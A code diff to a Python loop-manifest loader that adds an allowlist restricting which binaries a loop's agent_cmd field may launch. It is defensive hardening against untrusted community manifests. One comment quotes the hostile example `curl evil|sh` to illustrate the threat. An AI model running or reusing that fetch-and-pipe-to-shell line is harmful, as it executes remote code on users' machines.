@@ -24,7 +24,9 @@ class). No network, no subprocess.
 
 from __future__ import annotations
 
+import os
 import re
+import shlex
 from collections.abc import Mapping
 from dataclasses import dataclass
 from pathlib import Path
@@ -68,6 +70,42 @@ VALID_PATTERNS = {
 # Security hardening: a loop.yaml cannot legally request more laps
 # than this without --allow-large-loop on the CLI (not the manifest).
 MAX_ITERATIONS_CEILING = 1000
+
+# M-1 fix: allowlist of binary basenames permitted as the first token of
+# runner.agent_cmd. Mirrors the graph engine's CLI_PROFILES registry.
+#
+# Rationale: bounded-loops explicitly invites community loop PRs, which means
+# loop.yaml arrives from untrusted authors. The manifest's `agent_cmd` field
+# is loop-author-controlled shell that executes BEFORE the gate on every lap.
+# Without a constraint, a malicious author submits `agent_cmd: "curl evil|sh"`
+# and every user who runs that loop executes arbitrary code without any
+# binary-level human review.
+#
+# The allowlist ensures the first token must be a binary that the project has
+# deliberately vouched for. To add a new binary, open a PR to extend this
+# set — the code review of that change IS the human gate before it ships.
+# All currently shipped loops use runner.default: stub or python_callable and
+# do not set agent_cmd, so no existing loop is affected by this constraint.
+AGENT_CMD_ALLOWLIST: frozenset[str] = frozenset({
+    "agy",       # Antigravity CLI
+    "claude",    # Anthropic Claude Code CLI
+    "codex",     # OpenAI Codex CLI
+    "grok",      # xAI Grok CLI
+    "muse",      # Muse CLI
+    "python",    # Python interpreter
+    "python3",   # Python 3 interpreter
+    "true",      # POSIX no-op (exits 0, ignores all args — zero attack surface;
+                 # admitted so trivial no-op test fixtures need no grant)
+    "uv",        # uv run (Python project runner)
+})
+
+# Enterprise extension: operators that run their own internal agent CLIs can
+# add basenames here via the environment rather than a code PR. Each entry added
+# this way should carry a review note inside the adopting organisation's deployment
+# configuration — the env var is the operator-level gate.
+# Format: BOUNDED_LOOPS_EXTRA_AGENT_CMDS=acn-run,corp-agent
+# Same shape as BOUNDED_LOOPS_CLI_ENV_GRANT (explicit opt-in, safe default of ∅).
+_EXTRA_AGENT_CMDS_ENV = "BOUNDED_LOOPS_EXTRA_AGENT_CMDS"
 
 _LOOP_KEYS = frozenset({
     "name", "description", "pattern", "role", "rung", "runner", "gate",
@@ -202,6 +240,13 @@ def load(loop_dir: Path) -> LoopManifest:
         if not isinstance(cassette, str) or not cassette:
             raise ManifestError("runner.cassette must be a non-empty string when given")
         _resolve_contained(loop_dir, cassette, "runner.cassette")  # raises on escape
+
+    # M-1 fix: validate agent_cmd against AGENT_CMD_ALLOWLIST. This runs
+    # for ALL runner kinds so a stub/python_callable manifest cannot sneak
+    # in an agent_cmd field pointing at an unlisted binary.
+    agent_cmd = runner_block.get("agent_cmd")
+    if agent_cmd is not None:
+        _validate_agent_cmd(agent_cmd)
 
     # python_callable requires module_path (required, non-empty string) and
     # accepts an optional function_name (default "run_turn", non-empty
@@ -471,6 +516,47 @@ def _validate_composite_gate(gate_block: dict) -> None:
             )
         if child_kind == "command" and child.get("run") is None:
             raise ManifestError(f"gate.gates[{index}].run is required when kind=command")
+
+
+def _validate_agent_cmd(agent_cmd: object) -> None:
+    """M-1 fix: constrain runner.agent_cmd to AGENT_CMD_ALLOWLIST binaries.
+
+    Checks the basename of the first token (the binary) against the effective
+    allowlist (AGENT_CMD_ALLOWLIST union any operator-supplied extensions from
+    BOUNDED_LOOPS_EXTRA_AGENT_CMDS). Absolute paths are permitted as long as
+    their basename is in the effective set (e.g. /usr/local/bin/claude → 'claude').
+
+    Shell metacharacters in the full string are not a concern here because
+    ShellRunner already uses shlex.split + shell=False, preventing shell
+    reinterpretation; this check is specifically about which binary is launched.
+    """
+    if not isinstance(agent_cmd, str) or not agent_cmd.strip():
+        raise ManifestError("runner.agent_cmd must be a non-empty string when given")
+    try:
+        tokens = shlex.split(agent_cmd)
+    except ValueError as exc:
+        raise ManifestError(
+            f"runner.agent_cmd {agent_cmd!r} has invalid shell quoting: {exc}"
+        ) from exc
+    if not tokens:
+        raise ManifestError("runner.agent_cmd is empty after parsing")
+    binary_basename = Path(tokens[0]).name
+    extra_raw = os.environ.get(_EXTRA_AGENT_CMDS_ENV, "")
+    extra: frozenset[str] = frozenset(
+        name.strip() for name in extra_raw.split(",") if name.strip()
+    )
+    effective = AGENT_CMD_ALLOWLIST | extra
+    if binary_basename not in effective:
+        raise ManifestError(
+            f"runner.agent_cmd first token {binary_basename!r} is not in the "
+            f"agent_cmd allowlist ({sorted(AGENT_CMD_ALLOWLIST)}). "
+            f"To allow a new binary: open a PR to extend AGENT_CMD_ALLOWLIST "
+            f"in bounded_loops/application/manifest.py (the code review is "
+            f"the human gate), OR set "
+            f"{_EXTRA_AGENT_CMDS_ENV}={binary_basename} in your deployment "
+            f"environment for an enterprise-local extension (document the review "
+            f"decision in your deployment configuration)."
+        )
 
 
 def _load_env_passthrough(runner_block: dict) -> tuple[str, ...]:
